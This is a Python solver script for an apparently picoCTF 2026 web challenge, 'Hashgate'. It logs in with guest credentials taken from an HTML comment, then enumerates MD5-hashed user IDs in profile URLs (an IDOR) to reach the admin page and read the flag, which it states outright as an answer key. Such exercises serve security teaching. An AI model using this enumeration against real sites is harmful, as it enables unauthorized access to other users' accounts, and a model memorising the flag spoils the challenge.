#!/usr/bin/env python3
"""Solver for Challenge 750 Hashgate (picoCTF 2026, Web Exploitation).

Portal login with credentials in an HTML comment
(guest@cylabacademy.org / guest). POST /login redirects to
/profile/user/<md5(str(id))>. Guest is ID 3000; there is no session
cookie, so authorization is purely the unguessable-looking hash URL
(security by obscurity). MD5 of small integers is trivially enumerable:
~20 employees, admin found at ID 3010.

Usage: solve_750_hashgate.py [base-url]
Verified: academy{id0r_unl0ck_cbbb8f45} (POST /api/submissions/ -> correct:true)
"""
import hashlib
import json
import re
import sys
import urllib.request

BASE = "http://chatelaine.cylabacademy.net:23454"
EXPECTED = "academy{id0r_unl0ck_cbbb8f45}"
FLAG_PAT = re.compile(r"academy\{[^}]*\}|picoCTF\{[^}]*\}")


def fetch(url: str, data=None) -> str:
    req = urllib.request.Request(
        url, data=data,
        headers={"User-Agent": "Mozilla/5.0",
                 "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode(errors="replace")


def solve(base: str = BASE) -> str:
    base = base.rstrip("/")
    # 1. login as guest (confirms own hash URL pattern)
    body = json.dumps({"email": "guest@cylabacademy.org",
                       "password": "guest"}).encode()
    me = fetch(base + "/login", data=body)
    print("[*] guest profile:", me[:150].replace("\n", " | "))
    assert "3000" in me, "guest login flow changed"
    assert hashlib.md5(b"3000").hexdigest() == "e93028bdc1aacdfb3687181f2031765d"
    # 2. enumerate employee IDs through the MD5 hash URL
    for i in list(range(2980, 3021)) + list(range(1, 60)):
        h = hashlib.md5(str(i).encode()).hexdigest()
        try:
            page = fetch(base + "/profile/user/" + h)
        except Exception:
            continue
        m = FLAG_PAT.search(page)
        if m:
            print("[+] HIT id=%d hash=%s -> %s" % (i, h, m.group(0)))
            assert m.group(0) == EXPECTED, m.group(0)
            return m.group(0)
        if "Welcome" in page and "Guest" not in page:
            print("[!] non-guest page without flag at id=%d: %s" % (i, page[:200]))
    raise SystemExit("admin profile not found")


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else BASE))
